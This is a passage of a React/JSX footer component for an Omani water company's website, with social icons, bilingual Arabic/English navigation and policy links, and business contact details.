                <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
              </a>
              <a href="#" className="social-icon-btn" title="Facebook">
                <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M9 8H6v4h3v12h5V12h3.642L18 8h-4V6.333C14 5.374 14.5 5 15.5 5H18V0h-3.808C10.592 0 9 1.583 9 4.615V8z"/></svg>
              </a>
              <a href="https://wa.me/96893649190" className="social-icon-btn" title="WhatsApp">
                <MessageCircle className="w-4 h-4" />
              </a>
            </div>
          </div>

          <div className="footer-col">
            <h4>{t.quickLinks}</h4>
            <ul>
              <li><a href="/">{lang === "ar" ? "الرئيسية" : "Home"}</a></li>
              <li><a href="/#about">{lang === "ar" ? "من نحن" : "About"}</a></li>
              <li><a href="/#contact">{lang === "ar" ? "تواصل معنا" : "Contact"}</a></li>
              <li><a href="/#faq">{lang === "ar" ? "الأسئلة الشائعة" : "FAQ"}</a></li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>{t.policies}</h4>
            <ul>
              <li><a href="/#policies">{lang === "ar" ? "سياسة الخصوصية" : "Privacy Policy"}</a></li>
              <li><a href="/#policies">{lang === "ar" ? "الشروط والأحكام" : "Terms & Conditions"}</a></li>
              <li><a href="/#policies">{lang === "ar" ? "سياسة التوصيل" : "Delivery Policy"}</a></li>
              <li><a href="/#policies">{lang === "ar" ? "سياسة الاسترجاع" : "Refund Policy"}</a></li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>{t.contactUs}</h4>
            <div className="footer-contact-item">
              <MapPin className="w-4 h-4 text-sky-400" />
              <span>Muscat, Sultanate of Oman</span>
            </div>
            <div className="footer-contact-item">
              <Phone className="w-4 h-4 text-sky-400" />
              <span dir="ltr">+968 9364 9190</span>
            </div>
            <div className="footer-contact-item">
              <MessageCircle className="w-4 h-4 text-emerald-400" />
              <span dir="ltr">+968 9364 9190</span>
            </div>
            <div className="footer-contact-item">
              <Mail className="w-4 h-4 text-sky-400" />
              <span>info@omanoasis.com</span>
            </div>
          </div>
        </div>

        <div className="copyright-bar">
          {lang === "ar" ? "© OASIS OMAN 2026 — مياه الواحة. جميع الحقوق محفوظة." : "© 2026 OASIS OMAN. All rights reserved."}
        </div>
      </footer>
    </div>
  );
}
